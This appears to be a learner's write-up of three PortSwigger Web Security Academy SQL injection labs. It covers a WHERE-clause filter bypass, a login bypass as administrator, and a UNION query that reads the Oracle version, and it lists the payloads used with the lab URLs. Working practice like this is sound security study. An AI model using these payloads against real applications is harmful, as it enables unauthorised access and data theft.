<head>
  <style>
    body {
      font-family: "Georgia", serif;
      text-align: justify;
    }
  </style>
</head>

## Basic SQL Injection

<br>

# 01. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
#### Lab: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

<b>Problem:</b> This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
<code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code>
To solve the lab, perform a SQL injection attack that causes the application to <b>display one or more unreleased products</b>.

All the process I've done to perform SQLi are try to click on something clickable, then I tried to add "or" conditions such as <code>' or 1=1--</code>. Since I performed on URL, I add the <code>+</code> as a space, so the whole querry is <code>'+or+1=1--</code>. 
The steps can be reached below (sequence).
<!-- <ul>
    <li>https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/</li>
    <li>https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/filter?category=Lifestyle</li>
    <li>https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/filter?category=%27+or+1=1--</li>
</ul> -->
1. https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/
2. https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/filter?category=Lifestyle
3. https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/filter?category=%27+or+1=1--

<br>

# 02. SQL injection vulnerability allowing login bypass
#### Lab: https://portswigger.net/web-security/sql-injection/lab-login-bypass

<b>Problem:</b> This lab contains a SQL injection vulnerability in the login function.
To solve the lab, perform a SQL injection attack that <b>logs in to the application as the administrator user</b>.

Same as before, since this lab objective is to gain the access of administrator, then I used a basic SQLi payload such as <code>'or 1=1--</code>, <code>administrator' or 1=1--</code>, <code>administrator'--</code>. All of these payloads work perfectly, it is because there is no sanitazion and filter for the query on the form and the database. Also for the password I was type <code>a</code>, because the form forced user to fill all the field with value.

The steps can be reached below (sequence).
<!-- <ul>
    <li>https://0a0f006503b947e981064870003400ff.web-security-academy.net/</li>
    <li>https://0a0f006503b947e981064870003400ff.web-security-academy.net/login</li>
    <li><code>'or 1=1--</code> on Username input form and <code>a</code> on Password input form.</li>
</ul> -->
1. https://0a0f006503b947e981064870003400ff.web-security-academy.net/
2. https://0a0f006503b947e981064870003400ff.web-security-academy.net/login
3. <code>'or 1=1--</code> on <b>Username</b> input form and <code>a</code> on <b>Password</b> input form.

<br>

# 03. SQL injection attack, querying the database type and version on Oracle
#### Lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

<b>Problem: </b> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, display the database version string.
<b>Objectives: </b>
1. CORE 11.2.0.2.0 Production
2. NLSRTL Version 11.2.0.2.0 - Production
3. Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
4. PL/SQL Release 11.2.0.2.0 - Production
5. TNS for Linux: Version 11.2.0.2.0 - Production

Since they've mentioned the database is using Oracle, then there are a few conditions to attack, such as when we use SELECT, we have to use FROM (mentioned the existing table name). However, since we don't know the table name, we can use <b>dual</b>, because it is a built-in table on Oracle. First step is just looking for the one we can inject, then try to know the numbers of columns using <code></code>

The steps can be reached below (sequence).
1. https://0a9000fa039e58e8806b21f7004700a0.web-security-academy.net/
2. https://0a9000fa039e58e8806b21f7004700a0.web-security-academy.net/filter?category=Pets
3. https://0a9000fa039e58e8806b21f7004700a0.web-security-academy.net/filter?category=%27+union+select+%27abc%27,%20%27def%27+from+dual--
4. https://0a9000fa039e58e8806b21f7004700a0.web-security-academy.net/filter?category=%27+union+select+banner,NULL+from+v$version--

